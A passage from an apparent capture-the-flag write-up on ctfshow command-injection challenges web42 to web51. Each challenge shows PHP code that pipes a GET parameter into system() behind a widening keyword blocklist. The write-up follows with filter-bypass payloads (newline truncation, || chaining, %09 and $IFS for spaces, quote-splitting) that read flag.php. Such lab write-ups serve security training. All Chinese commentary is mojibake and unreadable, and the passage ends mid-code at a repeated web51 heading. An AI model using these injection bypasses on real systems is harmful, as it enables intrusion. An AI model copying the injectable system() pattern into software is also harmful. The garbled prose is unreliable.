</span></span></code></pre></div><p>å°†ä¸¤ä¸ªæ–‡ä»¶æ”¾åœ¨åŒä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œè¿è¡Œexp.pyå³å¯</p>
<p>ç¾½å¸ˆå‚…nb</p>
<p><img alt="image-20241124223329525" loading="lazy" src="assets/image-20241124223329525.png"></p>
<blockquote>
<p>æ³¨æ„é“¾æ¥è¦ç”¨httpä¸èƒ½ç”¨https</p></blockquote>
<h4 id="web42">web42<a hidden class="anchor" aria-hidden="true" href="#web42">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 20:51:55
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿™é“é¢˜ä¼šå°†æˆ‘ä»¬è¾“å…¥çš„å‘½ä»¤ä¸<code>&quot; &gt;/dev/null 2&gt;&amp;1&quot;</code>è¿›è¡Œæ‹¼æ¥</p>
<blockquote>
<p>/dev/null 2&gt;&amp;1 æ„æ€æ˜¯å°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯éƒ½é‡å®šå‘åˆ° /dev/null å³ä¸å›æ˜¾</p></blockquote>
<p>å¯¼è‡´æˆ‘ä»¬æ— æ³•æˆåŠŸæ‰§è¡Œ</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>%0a</code>æˆªæ–­çš„æ–¹å¼ç»•è¿‡</p>
<blockquote>
<p>tac fl*%0a</p></blockquote>
<p>or</p>
<blockquote>
<p>; //åˆ†å·
| //åªæ‰§è¡Œåé¢é‚£æ¡å‘½ä»¤
|| //åªæ‰§è¡Œå‰é¢é‚£æ¡å‘½ä»¤
&amp; //ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ
&amp;&amp; //ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ</p>
<p>è¿‡æ»¤äº†åˆ†å·å’Œcatï¼Œå¯ä»¥ç”¨||å’Œ&amp;æ¥ä»£æ›¿åˆ†å·ï¼Œtacä»£æ›¿cat</p>
<p>å¯æ„é€ playload:
url/?c=tac flag.php||
url/?c=tac flag.php%26
æ³¨æ„ï¼Œè¿™é‡Œçš„&amp;éœ€è¦urlç¼–ç </p></blockquote>
<h4 id="web43">web43<a hidden class="anchor" aria-hidden="true" href="#web43">#</a></h4>
<p>è¿‡æ»¤äº†catã€ï¼›ï¼Œ</p>
<p>ä¸æ˜¯å¾ˆå½±å“</p>
<pre tabindex="0"><code>tac fl*%0a

or

tac flag.php||

...
//è®°å¾—è½¬urlç¼–ç 
</code></pre><h4 id="web44">web44<a hidden class="anchor" aria-hidden="true" href="#web44">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 21:32:01
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/;|cat|flag/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿‡æ»¤äº†<code>;|cat|flag</code></p>
<p>å°é—®é¢˜</p>
<pre tabindex="0"><code>tac fl*%0a

or

tac f*||

...
//è®°å¾—è½¬urlç¼–ç 
</code></pre><h4 id="web45">web45<a hidden class="anchor" aria-hidden="true" href="#web45">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 21:35:34
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| /i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿‡æ»¤äº†<code>;|cat|flag</code>å’Œç©ºæ ¼</p>
<p>å¯ä»¥ç”¨%09æˆ–$IFS$9ä»£æ›¿ç©ºæ ¼</p>
<pre tabindex="0"><code>tac%09fl*%0a

or

tac%09f*||

or

echo$IFS`tac$IFS*`%0A

...
//è®°å¾—è½¬urlç¼–ç 
</code></pre><h4 id="web46">web46<a hidden class="anchor" aria-hidden="true" href="#web46">#</a></h4>
<pre tabindex="0"><code>&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:50:19
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET[&#39;c&#39;])){
    $c=$_GET[&#39;c&#39;];
    if(!preg_match(&#34;/\;|cat|flag| |[0-9]|\\$|\*/i&#34;, $c)){
        system($c.&#34; &gt;/dev/null 2&gt;&amp;1&#34;);
    }
}else{
    highlight_file(__FILE__);
}
</code></pre><p>è¿‡æ»¤æœ‰ç‚¹å¤šå•Š</p>
<blockquote>
<p>;|cat|flag| |[0-9]|\$|*</p></blockquote>
<p>ä½†æ˜¯äº‹å®ä¸Šæˆ‘ä»¬ä¸Šé¢˜ä½¿ç”¨çš„æ–¹æ³•å¹¶ä¸ä¼šå—åˆ°å½±å“ï¼Œå› ä¸º%09æ˜¯urlç¼–ç ï¼Œä¸ä¼šè¢«å½“æˆæ•°å­—è¿‡æ»¤</p>
<pre tabindex="0"><code>tac%09fl*%0a

or

tac%09f*||

or

tac&lt;f*||

//è®°å¾—è½¬urlç¼–ç 
</code></pre><h4 id="web47">web47<a hidden class="anchor" aria-hidden="true" href="#web47">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 21:59:23
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| |[0-9]|</span><span class="se">\\</span><span class="s2">$|\*|more|less|head|sort|tail/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿‡æ»¤è¿™ä¹ˆå¤šO.oï¼Ÿ</p>
<blockquote>
<p>;|cat|flag| |[0-9]|\$|*|more|less|head|sort|tail</p></blockquote>
<p>ä½†æ˜¯å¹¸å¥½æˆ‘ç”¨çš„æ˜¯tac</p>
<pre tabindex="0"><code>tac%09fl*%0a

or

tac%09f*||

or

tac&lt;f*||

//è®°å¾—è½¬urlç¼–ç 
</code></pre><h4 id="web48">web48<a hidden class="anchor" aria-hidden="true" href="#web48">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 22:06:20
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| |[0-9]|</span><span class="se">\\</span><span class="s2">$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿‡æ»¤æ›´å¤šäº†</p>
<blockquote>
<p>;|cat|flag| |[0-9]|\$|*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|`</p></blockquote>
<pre tabindex="0"><code>tac%09fl??.php%0a

or

tac%09fl??.php%7c%7c 
//è®°å¾—è½¬urlç¼–ç 
</code></pre><h4 id="web49">web49<a hidden class="anchor" aria-hidden="true" href="#web49">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 22:22:43
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| |[0-9]|</span><span class="se">\\</span><span class="s2">$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿‡æ»¤äº†</p>
<blockquote>
<p>;|cat|flag| |[0-9]|\$|*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|`|%</p></blockquote>
<p>è™½ç„¶è¿‡æ»¤äº†%ä½†æ˜¯æ˜¯ä¸å½±å“æˆ‘ä»¬ä¼ å…¥çš„urlç¼–ç çš„</p>
<pre tabindex="0"><code>tac%09fl??.php%0a

or

tac%09fl??.php%7c%7c 
</code></pre><h4 id="web50">web50<a hidden class="anchor" aria-hidden="true" href="#web50">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 22:32:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| |[0-9]|</span><span class="se">\\</span><span class="s2">$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿‡æ»¤äº†</p>
<blockquote>
<p>;|cat|flag| |[0-9]|\$|*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|`|%|\x09|\x26</p></blockquote>
<p>åï¼Œæ²¡æ³•ç”¨%09ä»£æ›¿ç©ºæ ¼ï¼Œæ²¡æ³•ç”¨?ä»£æ›¿å­—ç¬¦</p>
<p>ä¸è¿‡å¹¸å¥½è¿˜æœ‰&lt;å’Œ&rsquo;'</p>
<pre tabindex="0"><code>tac&lt;fla%27%27g.php||
or
tac&lt;fla%27%27g.php%0a
</code></pre><h4 id="web51">web51<a hidden class="anchor" aria-hidden="true" href="#web51">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 22:42:52
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| |[0-9]|</span><span class="se">\\</span><span class="s2">$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿‡æ»¤äº†</p>
<blockquote>
<p>;|cat|flag| |[0-9]|\$|*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|\x09|\x26/</p></blockquote>
<p>æ€ä¹ˆæŠŠæˆ‘tacä¹Ÿè¿‡æ»¤äº†</p>
<p>æ²¡äº‹èƒ½ç»•è¿‡</p>
<pre tabindex="0"><code>t%27%27ac&lt;fla%27%27g.php||
or
t%27%27ac&lt;fla%27%27g.php%0a
</code></pre><h4 id="web51-1">web51<a hidden class="anchor" aria-hidden="true" href="#web51-1">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
